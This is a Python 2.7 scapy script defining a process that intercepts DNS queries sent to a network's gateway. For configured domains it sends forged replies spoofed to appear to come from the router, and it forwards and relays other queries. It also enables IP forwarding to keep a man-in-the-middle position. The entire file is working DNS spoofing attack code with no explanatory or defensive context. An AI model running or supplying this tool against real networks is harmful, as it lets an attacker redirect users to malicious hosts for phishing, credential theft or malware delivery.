#!/usr/bin/python2.7 
 
import sys, time 
from scapy.all import * 
from multiprocessing import Process
import netifaces

class DNSfw(Process): 
  def __init__(self, i, gateway, conf):
    super(DNSfw, self).__init__()
    self.counter = 0
    self.interface = i
    self.conf = conf
    self.myip = netifaces.ifaddresses(i)[2][0]["addr"]
    self.mymac = netifaces.ifaddresses(i)[17][0]["addr"]
    self.router = gateway
    self.enableIpForwarding()

  def forward_dns(self, orig_pkt):
        copyReq = IP(dst=self.router)/UDP(sport=orig_pkt[UDP].sport)/\
            DNS(rd=1,id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname, qtype=orig_pkt[DNSQR].qtype, qclass=orig_pkt[DNSQR].qclass))
        response = sr1(copyReq, verbose=0)
        respPkt = IP(src = self.router, dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
        respPkt[DNS] = response[DNS]
        send(respPkt, verbose=0)
        if (respPkt.getlayer(DNS).an):
            return '#{}: {} ==> {} @({}):{}'.format(self.counter, respPkt[IP].src, respPkt[IP].dst, respPkt.getlayer(DNS).qd.qname, respPkt.getlayer(DNS).an.rdata)
        elif (respPkt.getlayer(DNS).ns):
            return '#{}: {} ==> {} @({}):{}'.format(self.counter, respPkt[IP].src, respPkt[IP].dst, respPkt.getlayer(DNS).qd.qname, respPkt.getlayer(DNS).ns.rdata)
  



  def get_response(self, pkt):
        if (
            pkt.haslayer(DNS) and
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0 and
            pkt[IP].src != self.myip
        ):
            spoofed = self.conf.getIPFromDomain(pkt[DNS].qd.qname)
            self.counter += 1
            if spoofed:
                spfResp = IP(dst=pkt[IP].src, src = self.router)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,  qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,ttl=10, rdata=spoofed)\
                    /DNSRR(rrname=pkt[DNS].qd.qname,rdata=spoofed))
                send(spfResp, verbose=0)
                if (spfResp.getlayer(DNS).an.rdata):    
                    return '#{}: {} ==> {} {}@{}'.format(self.counter, spfResp[IP].src, spfResp[IP].dst, spfResp[DNS].an.rrname, spfResp[DNS].an.rdata)
                else :
                    return 'dns forwarder error'
            else:
                return self.forward_dns(pkt)    
  
  def run(self):
    filter = 'udp dst port 53 and ip dst {0}'.format(self.router)
    sniff(filter=filter, prn=self.get_response)
    #three_whs()s
  def stop(self): 
    #self.e.set() 
    print " -- Stopping DNSSniff" 

  def enableIpForwarding(self):
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '1\n':
        ipf.write('1\n')
    ipf.close()